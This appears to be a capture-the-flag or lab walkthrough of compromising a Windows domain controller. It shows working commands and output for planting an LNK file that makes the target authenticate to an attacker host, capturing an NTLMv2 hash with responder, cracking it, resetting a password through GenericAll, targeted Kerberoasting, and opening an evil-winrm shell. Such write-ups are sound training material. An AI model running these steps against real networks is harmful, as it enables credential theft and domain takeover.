commonName=DC01.hack.smarter| Public Key type: rsa| Public Key bits: 2048| Signature Algorithm: sha256WithRSAEncryption| Not valid before: 2025-09-05T03:46:00| Not valid after:  2026-03-07T03:46:00| MD5:   4b40:6c01:63f1:81e4:4f56:64b7:8ef3:4bbc| SHA-1: 2ad1:c7dc:ab46:ae72:570a:ea85:2192:51cf:1707:3692| -----BEGIN CERTIFICATE-----| MIIC5jCCAc6gAwIBAgIQL7/TDfsBKaJEuIxvqLtNeDANBgkqhkiG9w0BAQsFADAc| MRowGAYDVQQDExFEQzAxLmhhY2suc21hcnRlcjAeFw0yNTA5MDUwMzQ2MDBaFw0y| NjAzMDcwMzQ2MDBaMBwxGjAYBgNVBAMTEURDMDEuaGFjay5zbWFydGVyMIIBIjAN| BgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAr/z97jkoYVuqCfcPuR2gCVRNgSK+| MB7v2Nxa64USo34Z8OzT758ox5d7FFrmZSm3A0bvUNtVYjw4qAekjAYNCSCZO1JI| GVDjieej7jRyApmXOCnV82Pp0pDZuc/v8hg1X1JNeXlI4vgi4cVXIQk2Cg6ljjap| DRcm2JARZ8gNFvn/VbDTBpipp2nFIENtCM0wwslxI4SGbx8+GisHqOwt0tbelpuL| JQ+uQPoddL45Fz7uQ/Pp/5nnqmtR/6yAR2jFir3v5/hZ7zycPCTlAocRth6azFW2| UTke69SByvN+BJdgP2QbyXWcJHwX0GatenQCzht4ZCq0O2CsX9+7+lPKbQIDAQAB| oyQwIjATBgNVHSUEDDAKBggrBgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcN| AQELBQADggEBAAVQZIet+fvKcDwhSGcITFyO7RHjL51Q0aauioSdlow50XVGZ8vW| ptOhb5GwWmGfo8abmKZO8mqK/SkaNU6pA7zwvBHVUqwWF2bMKyWKMBLOB0VIQaxT| ZfV0LL8KR3oCs1fuC60rxDF8JIEne9vgL5z+dmgxXd6SZJf1//ZPjmUf7ai3ohtg| MRq87WZuf2P7m2rZaPcIcyMDM0Zt5MSGr+bD9V2AboDrKh6TYrz4ODkNPUbeGyT/| q57XlN2ERF6OYCYAGpLdCDxHmAhQhihKbxtnC4vwhUCaXnDUSD2v+9WYbrFmWMNl| UCJT2ircDq6fnW4O9KJJhg5udslgzhQcT3Y=|_-----END CERTIFICATE-----|_ssl-date: 2025-11-23T21:01:42+00:00; 0s from scanner time.| rdp-ntlm-info:|   Target_Name: HACK|   NetBIOS_Domain_Name: HACK|   NetBIOS_Computer_Name: DC01|   DNS_Domain_Name: hack.smarter|   DNS_Computer_Name: DC01.hack.smarter|   DNS_Tree_Name: hack.smarter|   Product_Version: 10.0.20348|_  System_Time: 2025-11-23T21:01:34+00:005985/tcp open  http          syn-ack ttl 126 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-title: Not Found|_http-server-header: Microsoft-HTTPAPI/2.0Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| smb2-security-mode:|   3:1:1:|_    Message signing enabled and required|_clock-skew: mean: 0s, deviation: 0s, median: 0s| p2p-conficker:|   Checking for Conficker.C or higher...|   Check 1 (port 20320/tcp): CLEAN (Couldn&#x27;t connect)|   Check 2 (port 13605/tcp): CLEAN (Couldn&#x27;t connect)|   Check 3 (port 7253/udp): CLEAN (Timeout)|   Check 4 (port 64780/udp): CLEAN (Failed to receive data)|_  0/4 checks are positive: Host is CLEAN or ports are blocked| smb2-time:|   date: 2025-11-23T21:01:39|_  start_date: N/A
Adding the hostnames to our hosts file.
SMBWe can check the usual null auth and Guest logins to see if we have access.
konoha# nxc smb hack.smarter -u Guest -p &#x27;&#x27; --sharesSMB         10.0.21.159     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hack.smarter) (signing:True) (SMBv1:False)SMB         10.0.21.159     445    DC01             [+] hack.smarter\Guest:SMB         10.0.21.159     445    DC01             [*] Enumerated sharesSMB         10.0.21.159     445    DC01             Share           Permissions     RemarkSMB         10.0.21.159     445    DC01             -----           -----------     ------SMB         10.0.21.159     445    DC01             ADMIN$                          Remote AdminSMB         10.0.21.159     445    DC01             C$                              Default shareSMB         10.0.21.159     445    DC01             IPC$            READ            Remote IPCSMB         10.0.21.159     445    DC01             NETLOGON                        Logon server shareSMB         10.0.21.159     445    DC01             Share           READ,WRITESMB         10.0.21.159     445    DC01             SYSVOL                          Logon server share
Which in this case we do, and we have READ,WRITE. SO we can just upload a little lnk file using a module from NetExec. 
konoha# nxc smb hack.smarter -u Guest -p &#x27;&#x27; -M slinky -o SERVER=10.200.21.53 NAME=EVILMElol[*] Ignore OPSEC in configuration is set and OPSEC unsafe module loadedSMB         10.0.21.159     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hack.smarter) (signing:True) (SMBv1:False)SMB         10.0.21.159     445    DC01             [+] hack.smarter\Guest:SMB         10.0.21.159     445    DC01             [*] Enumerated sharesSMB         10.0.21.159     445    DC01             Share           Permissions     RemarkSMB         10.0.21.159     445    DC01             -----           -----------     ------SMB         10.0.21.159     445    DC01             ADMIN$                          Remote AdminSMB         10.0.21.159     445    DC01             C$                              Default shareSMB         10.0.21.159     445    DC01             IPC$            READ            Remote IPCSMB         10.0.21.159     445    DC01             NETLOGON                        Logon server shareSMB         10.0.21.159     445    DC01             Share           READ,WRITESMB         10.0.21.159     445    DC01             SYSVOL                          Logon server shareSLINKY      10.0.21.159     445    DC01             [+] Found writable share: ShareSLINKY      10.0.21.159     445    DC01             [+] Created LNK file on the Share share

Setting up responder, we are able to capture a hash for bob.ross.
konoha# responder -I tun0 -w                                         __  .----.-----.-----.-----.-----.-----.--|  |.-----.----.  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|  |__| |_____|_____|   __|_____|__|__|_____||_____|__|                   |__|[+] Poisoners:    LLMNR                      [ON]    NBT-NS                     [ON]    MDNS                       [ON]    DNS                        [ON]    DHCP                       [OFF][+] Servers:    HTTP server                [ON]    HTTPS server               [ON]    WPAD proxy                 [ON]    Auth proxy                 [OFF]    SMB server                 [ON]&lt;SNIP&gt;[+] Listening for events...[SMB] NTLMv2-SSP Client   : 10.0.21.159[SMB] NTLMv2-SSP Username : HACK\bob.ross[SMB] NTLMv2-SSP Hash     : bob.ross::HACK:de13d20268eb75c7:&lt;SNIP&gt;:&lt;SNIP&gt;

Sidequest to crack the codeIâ€™ve been using john alot lately, I know hashcat is far more superior, but it works better on a VM then hashcat does. 
konoha# john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt bob.ross.hashbob.ross:&lt;SNIP&gt;:HACK:&lt;SNIP&gt;:&lt;SNIP&gt;:01010000000000000068DBCE8A5CDC01EA1F015C7365CD7E00000000020008004200560053004F0001001E00570049004E002D00310047004D005600530033004B004300390058005A0004003400570049004E002D00310047004D005600530033004B004300390058005A002E004200560053004F002E004C004F00430041004C00030014004200560053004F002E004C004F00430041004C00050014004200560053004F002E004C004F00430041004C00070008000068DBCE8A5CDC0106000400020000000800300030000000000000000100000000200000DCBC15A58118355D3E1B347123254BC6DB985C847FADA324A020982E5BF737430A001000000000000000000000000000000000000900220063006900660073002F00310030002E003200300030002E00320031002E00350033000000000000000000

New Found LAND!!!With our newly aquired credentials, we can get a bloodhound dump and look at what we have. Iâ€™m using bloodyAD to get my dump.
konoha# bloodyAD -v DEBUG -d hack.smarther -u bob.ross -p &#x27;&lt;SNIP&gt;&#x27; -H dc01.hack.smarter get bloodhound[*] Connection URL: ldap+ntlm-pw://hack.smarther\bob.ross:&lt;SNIP&gt;@dc01.hack.smarter/?serverip=10.0.21.159[*] Trying to connect to dc01.hack.smarter...[*] Connection successful[+] Connecting to LDAP server[+] Connected to LDAP serrverDumping schema: 2it [00:00, 17.50it/s]Generating lookuptable: 79it [00:00, 250.85it/s]Dumping SDs: 100%|â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ| 83/83 [00:02&lt;00:00, 32.79it/s]Dumping domains: 100%|â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ| 1/1 [00:00&lt;00:00, 10.87it/s]Dumping users: 100%|â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ| 6/6 [00:00&lt;00:00, 173.06it/s]Dumping computers: 100%|â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ| 1/1 [00:00&lt;00:00, 32.17it/s]Dumping groups: 100%|â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ| 49/49 [00:00&lt;00:00, 995.52it/s]Dumping GPOs: 100%|â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ| 2/2 [00:00&lt;00:00, 68.76it/s]Dumping OUs: 100%|â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ| 1/1 [00:00&lt;00:00, 33.37it/s]Dumping Containers: 100%|â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ| 19/19 [00:00&lt;00:00, 363.72it/s][+] Bloodhound data saved to 20251123T234611_Bloodhound.zip[+] Found 0 trust

Once uploaded to bloodhound we can check pathes. This shows us we have GenericAll over alice.wonderland.

We can do many things here, but I simply just changed her password. I donâ€™t genuinely like to start off by changing the password, especially on a red-team engagement.  (Iâ€™ll show targetedKerberoasting as well.)
bloodyAD -v DEBUG -d hack.smarther -u bob.ross -p &#x27;&lt;SNIP&gt;&#x27; -H dc01.hack.smarter set password alice.wonderland P@ssw0rd[*] Connection URL: ldap+ntlm-pw://hack.smarther\bob.ross:&lt;SNIP&gt;@dc01.hack.smarter/?serverip=10.0.21.159[*] Trying to connect to dc01.hack.smarter...[*] Connection successful[+] Password changed successfully!
TargetedKerberoastingFirst we set a SPN for the user.
konoha# bloodyAD -v DEBUG -d hack.smarther -u bob.ross -p &#x27;137Password123!@#&#x27; -H dc01.hack.smarter msldap addspn &#x27;CN=alice.wonderland,CN=Users,DC=hack,DC=smarter&#x27; cifs/bic[*] Connection URL: ldap+ntlm-pw://hack.smarther\bob.ross:137Password123%21%40%23@dc01.hack.smarter/?serverip=10.0.21.159[*] Trying to connect to dc01.hack.smarter...[*] Connection successfulSPN added!

Then we can just simply targetedkerberoast this user.
konoha# python3 /opt/tools/targetedKerberoast/targetedKerberoast.py -u bob.ross -p &#x27;&lt;SNIP&gt;&#x27; --dc-ip 10.0.21.159 -d hack.smarter --request-user alice.wonderland[*] Starting kerberoast attacks[*] Attacking user (alice.wonderland)[+] Printing hash for (alice.wonderland)$krb5tgs$23$*alice.wonderland$HACK.SMARTER$hack.smarter/alice.wonderland*$c0877f710c4a3c59743ba96bd14a75e5$9e865d389a305516264f13644ba1e68dbb216e08e4cf70c31c0320aa53cd4bf2eef18b1c19ddfa3c71583eadb970a35eccdaec0a82c9537d45074af121cd13a1810824b0ff0be45dd8773176420b0055943ded1e96c1e7e4a716a9adfb9b8cb0aed78f8350a0fa2c162c3ca3b6ef6f59ed0236ad215b698bcf55bc84996d9893c7b4d533629ff3d42ea682a63864f9f677a6b4c021bdbe61895bb0296066401bf0b01a354d2b0e1f5b06ec64659c8425c1edd67ef4b1f764eca1af2fec2401002d46f0ef9580d36707f343fa9e3&lt;SNIP&gt;
We can try to crack, if itâ€™s a weak password, perhaps if it doesnâ€™t crack we could then resort to changing the password.
Getting a foot in the door
So starting off not too strong. No privileges for us to use.
konoha# evil-winrm -i dc01.hack.smarter -u alice.wonderland -p &#x27;P@ssw0rd&#x27;Evil-WinRM shell v3.7Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc&#x27; for module RelineData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completionInfo: Establishing connection to remote endpoint/var/lib/gems/3.3.0/gems/rexml-3.4.4/lib/rexml/xpath.rb:67: warning: REXML::XPath.each, REXML::XPath.first, REXML::XPath.match dropped support for nodeset...*Evil-WinRM* PS C:\Users\alice.wonderland\Documents&gt; whoami /privPRIVILEGES INFORMATION----------------------Privilege Name                Description                    State============================= ============================== =======SeMachineAccountPrivilege     Add workstations to domain     EnabledSeChangeNotifyPrivilege       Bypass traverse checking       EnabledSeIncreaseWorkingSetPrivilege Increase a process working set Enabled
Checking the OS, we have Windows Server 2022 Standard.
*Evil-WinRM* PS C:\Users\alice.wonderland\Documents&gt; Get-ComputerInfoWindowsBuildLabEx                                       : 20348.1.amd64fre.fe_release.210507-1500WindowsCurrentVersion                                   : 6.3WindowsEditionId                                        : ServerStandardWindowsInstallationType                                 : ServerWindowsInstallDateFromRegistry                          : 9/2/2025 9:09:11 PMWindowsProductId                                        : 00454-10000-00001-AA349WindowsProductName                                      : Windows Server 2022 Standard

For PrivEsc we can use Metasploit since itâ€™s well equipped with an armory.
PrivEsc
So we can create a shell with msfvenom and continue from there.
